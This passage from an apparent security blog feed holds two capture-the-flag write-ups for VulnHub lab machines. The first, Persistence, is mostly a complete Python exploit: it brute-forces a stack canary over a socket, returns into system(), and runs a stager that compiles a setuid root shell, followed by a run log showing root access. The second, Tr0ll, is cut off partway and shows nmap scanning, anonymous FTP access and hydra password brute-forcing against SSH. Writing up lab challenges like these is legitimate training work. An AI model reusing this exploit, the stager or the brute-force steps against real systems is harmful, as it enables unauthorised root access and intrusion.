bash-4.1$ ldd /usr/local/bin/wopr
    linux-gate.so.1 =&amp;gt;  (0xb7fff000)
    libc.so.6 =&amp;gt; /lib/libc.so.6 (0xb7e62000)
    /lib/ld-linux.so.2 (0x00110000)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The addresses for the linked files remained static between all of the lookups, indicating that ASLR was not enabled. This makes things slightly easier. Because this is a 32bit OS though, even if it was enabled it would not have been too much of a issue :)&lt;/p&gt;

&lt;p&gt;The next step was to find out where system() lived in libc. This is also a very easy step to perform. A interesting note here. GDB was using the SHELL env variable for commands, and because I have come from rbash, it was still set to that. A simple &lt;code&gt;export SHELL=/bin/bash&lt;/code&gt; fixed it though. Also, just to be clear, I am now doing this address lookup on the Persistence VM, however I had to do exactly the same thing on the Kali VM where I was building my exploit.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash-4.1$ export SHELL=/bin/bash

bash-4.1$ gdb -q /usr/bin/telnet
Reading symbols from /usr/bin/telnet...(no debugging symbols found)...done.
Missing separate debuginfos, use: debuginfo-install telnet-0.17-47.el6_3.1.i686
(gdb) b *main   # set a breakpoint to stop the flow once we hit the main() func
Breakpoint 1 at 0x7b90

(gdb) r         # run the program
Starting program: /usr/bin/telnet
Breakpoint 1, 0x00117b90 in main ()

(gdb) p system  # We hit our breakpoint, lets leak the address for system()
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7e56210 &amp;lt;system&amp;gt;
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We find &lt;code&gt;system()&lt;/code&gt; at &lt;code&gt;0xb7e56210&lt;/code&gt;. I used the telnet binary simply because it is also linked to libc.&lt;/p&gt;

&lt;p&gt;So to sum up what we have so far, lets take another look at what the stack will look like now when sending our exploit payload:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;- -&amp;gt;         - -&amp;gt;        [42 Bytes  in Total]        - -&amp;gt;           - &amp;gt;

[   A x 30   ] [  \xff\xff\xff\xff  ] [  AAAA  ] [  \x10\x62\xe5\xb7  ]
 ^~ Initial BF    ^~ Bruted cookie                    ^~ system()

- -&amp;gt;         - -&amp;gt;        [42 Bytes  in Total]        - -&amp;gt;           - &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The address for &lt;code&gt;system()&lt;/code&gt; is &amp;lsquo;backwards&amp;rsquo; because we are working with a &lt;a href=&#34;http://en.wikipedia.org/wiki/Endianness&#34;&gt;little endian&lt;/a&gt; system. The 4 * A before the address to &lt;code&gt;system()&lt;/code&gt; is simply padding to EIP.&lt;/p&gt;

&lt;h2 id=&#34;wopr-code-exec&#34;&gt;wopr - code exec&lt;/h2&gt;

&lt;p&gt;This part, by far, took me &lt;strong&gt;the longest&lt;/strong&gt; of the entire challenge!&lt;/p&gt;

&lt;p&gt;The next step was to get actual code to execute using &lt;code&gt;system()&lt;/code&gt;. While this may sound trivial, it has challenges of its own. One of the key things I had to realize whilst getting frustrated with this was &amp;ldquo;to remember, you are trying to make a program do what it is not intended to do, expect difficulty!&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;I tried to put a command in a env variable and failed.
I attempted to write a ROP chain and failed.&lt;/p&gt;

&lt;p&gt;These failed mostly due to by own lack of understanding, tiredness and frustration. My attempts generally was to get a script &lt;code&gt;/tmp/runme&lt;/code&gt; to run. &lt;code&gt;runme&lt;/code&gt; was a bash script that will compile a small C shell, change ownership and set the suid bit. Yes, Persistence had &lt;code&gt;gcc&lt;/code&gt; installed :)&lt;/p&gt;

&lt;p&gt;&amp;ldquo;fail&amp;rdquo; * 100000 * 100000. That is a rough guestimate of the amount of times I tried this part.&lt;/p&gt;

&lt;p&gt;Eventually, I finally came to the realization that I may have to search for other avenues of code execution. In fact, I completely stepped away from the VM and did something else.&lt;/p&gt;

&lt;p&gt;Returning later with a fresh look, I run wopr through &lt;code&gt;strings&lt;/code&gt; one more time:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/persistence# strings  wopr
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used

[.. snip ..]

[^_]
[+] yeah, I don&#39;t think so
socket
setsockopt
bind
[+] bind complete
listen
/tmp/log          # &amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;
TMPLOG
[+] waiting for connections
[+] logging queries to $TMPLOG
accept
[+] got a connection
[+] hello, my name is sploitable
[+] would you like to play a game?
[+] bye!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;See that? Can you &lt;strong&gt;see&lt;/strong&gt; that&amp;hellip; We have &lt;code&gt;/tmp/log&lt;/code&gt; RIGHT THERE!&lt;/p&gt;

&lt;p&gt;I confirmed that &lt;code&gt;/tmp/log&lt;/code&gt; wasn&amp;rsquo;t actually in use, and moved my original &lt;code&gt;/tmp/runme&lt;/code&gt; script there.&lt;/p&gt;

&lt;p&gt;The only thing that was left now was to find the location of the string &lt;code&gt;/tmp/log&lt;/code&gt; in &lt;code&gt;wopr&lt;/code&gt;, push that to the stack, and ride the bus home. So lets do the hard work required to find this valuable piece of the puzzle:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# gdb -q ./wopr
Reading symbols from wopr...(no debugging symbols found)...done.

gdb-peda$ b *main
Breakpoint 1 at 0x80487de

gdb-peda$ r
[----------------------------------registers-----------------------------------]
EAX: 0xbffff4a4 --&amp;gt; 0xbffff60a (&amp;quot;wopr&amp;quot;)
EBX: 0xb7fbfff4 --&amp;gt; 0x14bd7c
ECX: 0x66a6f92e
EDX: 0x1
ESI: 0x0
EDI: 0x0
EBP: 0xbffff478 --&amp;gt; 0x0
ESP: 0xbffff3fc --&amp;gt; 0xb7e8ae36 (&amp;lt;__libc_start_main+230&amp;gt;:    mov    DWORD PTR [esp],eax)
EIP: 0x80487de (&amp;lt;main&amp;gt;: push   ebp)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80487d7 &amp;lt;get_reply+99&amp;gt;:    call   0x804865c &amp;lt;__stack_chk_fail@plt&amp;gt;
   0x80487dc &amp;lt;get_reply+104&amp;gt;:   leave
   0x80487dd &amp;lt;get_reply+105&amp;gt;:   ret
=&amp;gt; 0x80487de &amp;lt;main&amp;gt;:    push   ebp
   0x80487df &amp;lt;main+1&amp;gt;:  mov    ebp,esp
   0x80487e1 &amp;lt;main+3&amp;gt;:  sub    esp,0x258
   0x80487e7 &amp;lt;main+9&amp;gt;:  mov    eax,DWORD PTR [ebp+0x8]
   0x80487ea &amp;lt;main+12&amp;gt;: mov    DWORD PTR [ebp-0x23c],eax
[------------------------------------stack-------------------------------------]
0000| 0xbffff3fc --&amp;gt; 0xb7e8ae36 (&amp;lt;__libc_start_main+230&amp;gt;:   mov    DWORD PTR [esp],eax)
0004| 0xbffff400 --&amp;gt; 0x1
0008| 0xbffff404 --&amp;gt; 0xbffff4a4 --&amp;gt; 0xbffff60a (&amp;quot;wopr&amp;quot;)
0012| 0xbffff408 --&amp;gt; 0xbffff4ac --&amp;gt; 0xbffff629 (&amp;quot;SSH_AGENT_PID=3171&amp;quot;)
0016| 0xbffff40c --&amp;gt; 0xb7fe08d8 --&amp;gt; 0xb7e74000 --&amp;gt; 0x464c457f
0020| 0xbffff410 --&amp;gt; 0xb7ff6821 (mov    eax,DWORD PTR [ebp-0x10])
0024| 0xbffff414 --&amp;gt; 0xffffffff
0028| 0xbffff418 --&amp;gt; 0xb7ffeff4 --&amp;gt; 0x1cf2c
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Breakpoint 1, 0x080487de in main ()

gdb-peda$ searchmem /tmp/log
Searching for &#39;/tmp/log&#39; in: None ranges
Found 2 results, display max 2 items:
wopr : 0x8048c60 (&amp;quot;/tmp/log&amp;quot;)
wopr : 0x8049c60 (&amp;quot;/tmp/log&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;/tmp/log&lt;/code&gt; can be found in 2 places. Lets choose &lt;code&gt;0x8048c60&lt;/code&gt;! Now we finally have everything we need to build the payload to send.&lt;/p&gt;

&lt;h2 id=&#34;wopr-the-exploit&#34;&gt;wopr - the exploit&lt;/h2&gt;

&lt;p&gt;To sum up what we have to do to exploit this, we can say that we have to:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Provide a string of size 30&lt;/li&gt;
&lt;li&gt;Provide the canary we have brute forced&lt;/li&gt;
&lt;li&gt;Pad with 4 bytes&lt;/li&gt;
&lt;li&gt;Write EIP to the location of &lt;code&gt;system()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Provide 4 bytes of JUNK (or the location of &lt;code&gt;exit()&lt;/code&gt; as a return)&lt;/li&gt;
&lt;li&gt;Provide the location of &lt;code&gt;/tmp/log&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In my exploit, as a result of the above, I would therefore send a payload similar to this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;&amp;quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;quot; + &amp;quot;\xff\xff\xff\xff&amp;quot; + &amp;quot;AAAA&amp;quot; +
&amp;quot;\x10\xc2\x16\x00&amp;quot; + &amp;quot;JUNK&amp;quot; + &amp;quot;\x60\x8c\x04\x08&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I finished up coding the exploit, which eventually resulted in the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
import sys
import os

payload = &amp;quot;A&amp;quot; * 30  # amount of bytes to before the canary is hit
canary = &amp;quot;&amp;quot;     # canary that should update as its bruted

print &amp;quot;&amp;quot;&amp;quot;
            A: &amp;quot;So, I heard you like pain...?&amp;quot;
            B: &amp;quot;... a bit&amp;quot;
            C: &amp;quot;Well, here it is, the: &amp;quot;
 ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
|    \ /  _]|    \  / ___/|    / ___/|      |  /  _]|    \   /  ]  /  _]
|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_
|   _/    _]|    /  \__  | |  |\__  ||_|  |_||    _]|  |  |/  /  |    _]
|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_
|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
|__| |_____||__|\_|  \___||____|\___|  |__|  |_____||__|__|\____||_____|
      _____ ____  _       ___  ____  ______
     / ___/|    \| |     /   \|    ||      |
    (   \_ |  o  ) |    |     ||  | |      |
     \__  ||   _/| |___ |  O  ||  | |_|  |_|
     /  \ ||  |  |     ||     ||  |   |  |
     \    ||  |  |     ||     ||  |   |  |
      \___||__|  |_____| \___/|____|  |__|

                A: &amp;quot;AKA: FU superkojiman &amp;amp;&amp;amp; sagi- !!&amp;quot;
                A: &amp;quot;I also have no idea what I am doing&amp;quot;
&amp;quot;&amp;quot;&amp;quot;

print &amp;quot;[+] Connecting &amp;amp; starting canary brute force...&amp;quot;

# start the canary brute loop. We want to brute 4 bytes ...
for x in xrange(1,5):

    # ... and try all possibilities
    for canary_byte in xrange(0, 256):

        # prepare the byte
        hex_byte = chr(canary_byte)

        # prepare the payload
        send = payload + canary + hex_byte

        # connect and send payload
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((&#39;127.0.0.1&#39;, 3333))

        # get the inital banners
        sock.recv(35)   # [+] hello, my name is sploitable\n
        sock.recv(40)   # [+] would you like to play a game?\n
        sock.recv(5)    # &amp;gt;

        # send the payload
        sock.send(send)
        sock.recv(27)   # [+] yeah, I don&#39;t think so\n

        # if we have a OK response, then we will have this last part
        # as &#39;[+] bye!\n&#39; populated, if its wrong, not
        data =  sock.recv(64)   # [+] bye!\n
        if &amp;quot;bye&amp;quot; in data:
            print &amp;quot;[+] Found a possible canary value of &#39;{0}&#39;!&amp;quot;.format(hex_byte.encode(&amp;quot;hex&amp;quot;))
            canary += hex_byte
            sock.close()
            break

        sock.close()
    # if we cant even find the first byte, we failed already
    if len(canary) &amp;lt;= 0:
        print &amp;quot;[-] Unable to even find the first bit of the canary. No luck&amp;quot;
        sys.exit(0)

# The canary is our ticket out of here!
if len(canary) == 4:

    print &amp;quot;[+] Canary known as : {0}&amp;quot;.format(canary.encode(&amp;quot;hex&amp;quot;))
    print &amp;quot;[+] Writing /tmp/log to be called by wopr later&amp;quot;

    # ./wopr has the string /tmp/log in it. We will use this as
    # our code exec point, overwriting whatever is in it atm
    stager = &amp;quot;&amp;quot;&amp;quot;
        #!/bin/sh

        # First, prepare a small C shell and move it to /tmp with name getroot
        echo &amp;quot;int main(void)\n{\nsetuid(0);\nsystem(\\&amp;quot;/bin/sh\\&amp;quot;);\nreturn 0;\n}&amp;quot; &amp;gt; /tmp/getroot.c

        # compile it
        /usr/bin/gcc /tmp/getroot.c -o /tmp/getroot

        # change ownership and setuid
        /bin/chown root:root /tmp/getroot
        /bin/chmod 4777 /tmp/getroot
    &amp;quot;&amp;quot;&amp;quot;

    # write the file
    with open(&#39;/tmp/log&#39;,&#39;w&#39;) as stager_file:
        stager_file.write(stager)

    # make it executable
    os.chmod(&#39;/tmp/log&#39;, 0755)

    # now, with the stack canary known and the stager ready, lets corrupt
    # EIP and sploit!
    payload += canary               # canary we bruted
    payload += &amp;quot;A&amp;quot; * 4              # padding to EIP wich is at byte 42
    payload += &amp;quot;\x10\x62\xe5\xb7&amp;quot;   # system() @ 0xb7e56210, NULL is ok cause memcpy(). Recheck location of system in gdb incase the sploit fails.
    payload += &amp;quot;JUNK&amp;quot;               # JUNK. Should probably do exit() here. Meh.
    payload += &amp;quot;\x60\x8c\x04\x08&amp;quot;   # location if /tmp/log string in .data

    # and connect &amp;amp;&amp;amp; send
    print &amp;quot;[+] Connecting to service&amp;quot;
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((&#39;127.0.0.1&#39;, 3333))
    sock.recv(35)
    sock.recv(40)
    sock.recv(5)
    print &amp;quot;[+] Sending Payload&amp;quot;
    sock.send(payload)

    sock.recv(64)
    sock.close()
    print &amp;quot;[+] Done&amp;quot;

    print &amp;quot;[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)&amp;quot;
    os.system(&amp;quot;/tmp/getroot&amp;quot;)

else:
    print &amp;quot;[!] Incomplete Canary. Can&#39;t continue reliably&amp;quot;

# done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A sample run would be:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash-4.1$ ls -lah /tmp/sploit.py
-rw-rw-r--. 1 avida avida 4.0K Sep 18 10:33 /tmp/sploit.py
bash-4.1$ python /tmp/sploit.py

            A: &amp;quot;So, I heard you like pain...?&amp;quot;
            B: &amp;quot;... a bit&amp;quot;
            C: &amp;quot;Well, here it is, the: &amp;quot;
 ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
|    \ /  _]|    \  / ___/|    / ___/|      |  /  _]|    \   /  ]  /  _]
|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_
|   _/    _]|    /  \__  | |  |\__  ||_|  |_||    _]|  |  |/  /  |    _]
|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_
|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
|__| |_____||__|\_|  \___||____|\___|  |__|  |_____||__|__|\____||_____|
      _____ ____  _       ___  ____  ______
     / ___/|    \| |     /   \|    ||      |
    (   \_ |  o  ) |    |     ||  | |      |
     \__  ||   _/| |___ |  O  ||  | |_|  |_|
     /  \ ||  |  |     ||     ||  |   |  |
     \    ||  |  |     ||     ||  |   |  |
      \___||__|  |_____| \___/|____|  |__|

                A: &amp;quot;AKA: FU superkojiman &amp;amp;&amp;amp; sagi- !!&amp;quot;
                A: &amp;quot;I also have no idea what I am doing&amp;quot;

[+] Connecting &amp;amp; starting canary bruteforce...
[+] Found a possible canary value of &#39;64&#39;!
[+] Found a possible canary value of &#39;d3&#39;!
[+] Found a possible canary value of &#39;c6&#39;!
[+] Found a possible canary value of &#39;15&#39;!
[+] Canary known as : 64d3c615
[+] Writing /tmp/log to be called by wopr later
[+] Connecting to service
[+] Sending Payload
[+] Done
[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)
sh-4.1# id
uid=0(root) gid=500(avida) groups=0(root),500(avida) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And, as proof, we cat the flag!&lt;/p&gt;

&lt;p&gt;```bash Persistence w00t
sh-4.1# cat /root/flag.txt
              .d8888b.  .d8888b. 888
             d88P  Y88bd88P  Y88b888
             888    888888    888888
888  888  888888    888888    888888888
888  888  888888    888888    888888
888  888  888888    888888    888888
Y88b 888 d88PY88b  d88PY88b  d88PY88b.
 &amp;ldquo;Y8888888P&amp;rdquo;  &amp;ldquo;Y8888P&amp;rdquo;  &amp;ldquo;Y8888P&amp;rdquo;  &amp;ldquo;Y888&lt;/p&gt;

&lt;p&gt;Congratulations!!! You have the flag!&lt;/p&gt;

&lt;p&gt;We had a great time coming up with the
challenges for this boot2root, and we
hope that you enjoyed overcoming them.&lt;/p&gt;

&lt;p&gt;Special thanks goes out to @VulnHub for
hosting Persistence for us, and to
@recrudesce for testing and providing
valuable feedback!&lt;/p&gt;

&lt;p&gt;Until next time,
      sagi- &amp;amp; superkojiman
```&lt;/p&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;

&lt;p&gt;Persistence kicked ass!! I learned a ton and that is the ultimate win. Thanks sagi- &amp;amp;&amp;amp; superkojiman for an incredible challenge! Thanks Vulnhub for the hosting and community!&lt;/p&gt;

&lt;h2 id=&#34;thats-not-all&#34;&gt;thats not all&lt;/h2&gt;

&lt;p&gt;There are however a few more things I&amp;rsquo;d like to try.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Find if and how we can root Persistence using &lt;code&gt;sysadmin-tool&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Modify the exploit to a working ROP payload&lt;/li&gt;
&lt;li&gt;Explore other avenues to break out of rbash&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>taming the troll</title>
      <link>https://leonjza.github.io/blog/2014/08/15/taming-the-troll/</link>
      <pubDate>Fri, 15 Aug 2014 07:12:03 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2014/08/15/taming-the-troll/</guid>
      <description>

&lt;h2 id=&#34;foreword&#34;&gt;foreword&lt;/h2&gt;

&lt;p&gt;Having recently started the road to &lt;a href=&#34;http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/&#34;&gt;OSCP&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/Maleus21&#34;&gt;@Maleus21&lt;/a&gt; released &lt;a href=&#34;http://vulnhub.com/entry/tr0ll-1,100/&#34;&gt;Tr0ll&lt;/a&gt; on &lt;a href=&#34;https://twitter.com/VulnHub&#34;&gt;@VulnHub&lt;/a&gt;. I figured since the description was &lt;em&gt;Difficulty: Beginner ; Type: boot2root&lt;/em&gt;, I could give it a smash in a evening as a bit of distraction.&lt;/p&gt;

&lt;h2 id=&#34;nomad-promise&#34;&gt;nomad, promise&lt;/h2&gt;

&lt;p&gt;As usual, I downloaded the VM, extracted the &lt;code&gt;.rar&lt;/code&gt; and slapped it in Virtual Box. I got the IP 192.168.56.101. Promptly a NMAP was run against it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap -v --reason -sV 192.168.56.101 -p-

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.2
22/tcp open  ssh     syn-ack (protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, &lt;code&gt;ssh&lt;/code&gt;, &lt;code&gt;ftp&lt;/code&gt;, and &lt;code&gt;http&lt;/code&gt;. Naturally my first reaction was to inspect the web service.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/troll_web.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The &lt;code&gt;robots.txt&lt;/code&gt; file revealed:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;User-agent:*
Disallow: /secret
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Browsing to &lt;code&gt;/secret&lt;/code&gt; revealed yet another &lt;em&gt;interesting&lt;/em&gt; piece of art:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/troll_secret_path.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Right&amp;hellip; A little early to be &amp;lsquo;mad&amp;rsquo;, but nonetheless, lets move on.&lt;/p&gt;

&lt;h2 id=&#34;anonny-mouse-ftp&#34;&gt;anonny-mouse ftp&lt;/h2&gt;

&lt;p&gt;A quick and lazy google for &lt;code&gt;vsftpd 3.0.2 exploit&lt;/code&gt; didn&amp;rsquo;t reveal anything interesting on page 1, so I lost interest pretty fast. I figured I can just try my luck and attempt to login to the FTP service with anonymous creds:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ftp 192.168.56.101
Connected to 192.168.56.101.
220 (vsFTPd 3.0.2)
Name (192.168.56.101:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp&amp;gt; ls
500 Illegal PORT command.
ftp: bind: Address already in use

ftp&amp;gt; passive
Passive mode on.

ftp&amp;gt; ls
227 Entering Passive Mode (192,168,56,101,231,190)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10 00:43 lol.pcap
226 Directory send OK.

ftp&amp;gt; get lol.pcap
local: lol.pcap remote: lol.pcap
227 Entering Passive Mode (192,168,56,101,189,113)
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
226 Transfer complete.
8068 bytes received in 0.00 secs (21294.3 kB/s)

ftp&amp;gt; bye
221 Goodbye.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Well that worked, and showed that we have a file &lt;code&gt;lol.pcap&lt;/code&gt; to look at. Interesting. I fired up wireshark and opened the pcap. Following the TCP streams it looked like in a previous session there was activity with a file called &lt;code&gt;secret_stuff.txt&lt;/code&gt; that is no longer available. I filtered out that stream and continued down the rabbit hole, until I saw the message:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/troll_pcap.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Ok. Well. I tried a few things after this, until eventually I figured it may be a web path. Sooo, off to the website we went and browsed to &lt;a href=&#34;http://192.168.56.101/sup3rs3cr3tdirlol/&#34;&gt;http://192.168.56.101/sup3rs3cr3tdirlol/&lt;/a&gt;. In this path there was a binary  called &lt;code&gt;roflmao&lt;/code&gt;. I downloaded the bin and did some static analysis (paranoid and all that) to see if I can figure out what it does before running it. Eventually I just made it executable and ran it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# wget http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
--2014-08-15 07:57:56--  http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7296 (7.1K)
Saving to: `roflmao&#39;

100%[======&amp;gt;] 7,296       --.-K/s   in 0s

2014-08-15 07:57:56 (826 MB/s) - `roflmao&#39; saved [7296/7296]

root@kali:~/Desktop/Tr0ll# chmod +x roflmao
root@kali:~/Desktop/Tr0ll# ./roflmao
Find address 0x0856BF to proceed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nice. &lt;code&gt;0x0856BF&lt;/code&gt; is not exactly helpful. But what does it mean? From the previous analysis I have done it also looked like the bin is really just printing the string as can be seen above. After some poking around and exchanging ideas with &lt;a href=&#34;https://twitter.com/barrebas&#34;&gt;@barrebas&lt;/a&gt; on IRC, I remembered that the previous vague hint was a directory on the web site. So, I tried &lt;a href=&#34;http://192.168.56.101/0x0856BF/:&#34;&gt;http://192.168.56.101/0x0856BF/:&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/troll_0x856bf.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;nohydraplz&#34;&gt;nohydraplz&lt;/h2&gt;

&lt;p&gt;Cool! At this stage I was pretty sure there was not much left to gain shell. The folder &lt;code&gt;good_luck&lt;/code&gt; had a file called &lt;code&gt;which_one_lol.txt&lt;/code&gt; with contents:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;maleus
ps-aux
felux
Eagle11
genphlux &amp;lt; -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;List of passwords? Dunno. The folder &lt;code&gt;this_folder_contains_the_password&lt;/code&gt; had a file &lt;code&gt;Pass.txt&lt;/code&gt; with contents:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Good_job_:)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;At this stage I figured this had to be either a nicely provided wordlist for some &lt;code&gt;hydra&lt;/code&gt; action on the &lt;code&gt;ftp&lt;/code&gt; || &lt;code&gt;ssh&lt;/code&gt; service. So naturally, I copied the information to a file called &lt;code&gt;list.txt&lt;/code&gt; (also made a copy of the &lt;code&gt;genphlux&lt;/code&gt; word so that its on its own line), and fired up hydra on &lt;code&gt;ssh&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# hydra -v -V -u -L list -P list -t 1 -u 192.168.56.101 ssh
Hydra v7.6 (c)2013 by van Hauser/THC &amp;amp; David Maciejak - for legal purposes only

[DATA] attacking service ssh on port 22
[VERBOSE] Resolving addresses ... done
[ATTEMPT] target 192.168.56.101 - login &amp;quot;maleus&amp;quot; - pass &amp;quot;maleus&amp;quot; - 1 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;ps-aux&amp;quot; - pass &amp;quot;maleus&amp;quot; - 2 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;felux&amp;quot; - pass &amp;quot;maleus&amp;quot; - 3 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;Eagle11&amp;quot; - pass &amp;quot;maleus&amp;quot; - 4 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;genphlux &amp;lt; -- Definitely not this one&amp;quot; - pass &amp;quot;maleus&amp;quot; - 5 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;genphlux&amp;quot; - pass &amp;quot;maleus&amp;quot; - 6 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;usmc8892&amp;quot; - pass &amp;quot;maleus&amp;quot; - 7 of 169 [child 0]

[ERROR] could not connect to target port 22
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.56.101 - login &amp;quot;usmc8892&amp;quot; - pass &amp;quot;maleus&amp;quot; - 7 of 169 [child 0]

[ERROR] could not connect to target port 22
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.56.101 - login &amp;quot;usmc8892&amp;quot; - pass &amp;quot;maleus&amp;quot; - 7 of 169 [child 0]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Err, the sudden errors only meant one thing&amp;hellip; &lt;code&gt;fail2ban&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap -v --reason -Pn 192.168.56.101 -p 22

PORT   STATE    SERVICE REASON
22/tcp filtered ssh     no-response

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, this was the first part that frustrated me and had me going &lt;em&gt;&amp;ldquo;seriously&amp;hellip; :\&amp;rdquo;&lt;/em&gt;. Maybe this was actually a list of &lt;code&gt;ftp&lt;/code&gt; creds? Sadly, that did not seem to be the case either. And so I was stuck once again. Hydra was slowly trickling on once the ssh service was unbanned again, but it was annoying as heck.&lt;/p&gt;

&lt;h2 id=&#34;first-shell&#34;&gt;first shell&lt;/h2&gt;

&lt;p&gt;I kept bouncing the VM to get the ssh service back faster, allowing hydra to do it&amp;rsquo;s &lt;code&gt;thing&lt;/code&gt;. Eventually, it was apparent that none of these words as a username/password combination was the correct one.&lt;/p&gt;

&lt;p&gt;Returning to the web interface and the word lists, I realized (with some subtle hints and reminders from @barrebas to &lt;em&gt;read&lt;/em&gt; everything), that the password may be in this folder (&lt;code&gt;this_folder_contains_the_password&lt;/code&gt;). Get it, the &lt;code&gt;Pass.txt&lt;/code&gt; is the password&amp;hellip;&lt;/p&gt;

